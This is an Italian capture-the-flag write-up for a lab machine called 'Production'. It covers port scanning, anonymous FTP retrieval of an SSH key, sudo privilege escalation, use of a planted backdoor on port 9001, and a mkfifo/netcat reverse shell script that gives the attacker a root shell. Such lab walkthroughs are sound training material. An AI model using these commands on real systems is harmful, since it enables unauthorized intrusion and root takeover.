# PRODUCTION

### enum
facciamo uno scan delle porte
```bash
nmap production.thm -sV -sC 
```

troviamo un ftp con accesso anonimo vediamo cosa c'è dentro

## FTP

```bash
ftp Anonymous@production.thm
```
ottimo abbiamo una fleg e delle credenziali ssh per ashu

prendiamo l'id_rsa

```bash
get id_rsa
```

ovviamente diamogli i permessi giusti 

```bash
chmod 600 id_rsa
```
colleghiamoci in ssh

## SSH
```bash
ssh -i id_rsa ashu@10.10.224.175
```

ottimo facciamo privesc

## privesc

```bash
sudo -l
```
OTTIMO possiamo switchare utente come skidy

```bash
sudo su skidy
```

andiamo nella directory di skidy

abbiamo trovato una directory che si chiama homework. entriamoci!

abbiamo un file python, leggiamo cosa c'è scritto

ottimo c'è un password per un backdoor sulla porta 9001 a quanto pare 

vediamo skidy cosa può eseguire come sudo

```bash
sudo -l
```

possiamo eseguire il comendo git come sudo(andate a guardare su gtfo.bins) 


ora pensiamo alla backdoor

## backdoor

tramite la shell root colleghiamoci alla porta 9001
```bash
nc 10.10.224.175 9001
```

usiamo la password trovata nel file python di prima

bene siamo dentro 

usiamo un reverse shell per la porta 9002
```bash
echo "#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ipvostro portainascolto >/tmp/f" > /tmp/a; chmod +x /tmp/a
```
apriamo un altro terminale e mettiamoci in ascolto sulla porta 9002
```bash
nc production.thm 9002
```
poi apriamo un altro terminale e mettiamoci in ascolto sulla reverse shell che abbiamo creato prima 

```bash
nc -lvnp porta scelta nella reverse shell
```

sul primo terminale qundi quello avviato sulla porta 9002 mandiamo il comando
```bash
/tmp/./a
```
questo comando avvierà una reverse shell con privilegi di root sul votro terminale su cui vie eravati messi in ascolto



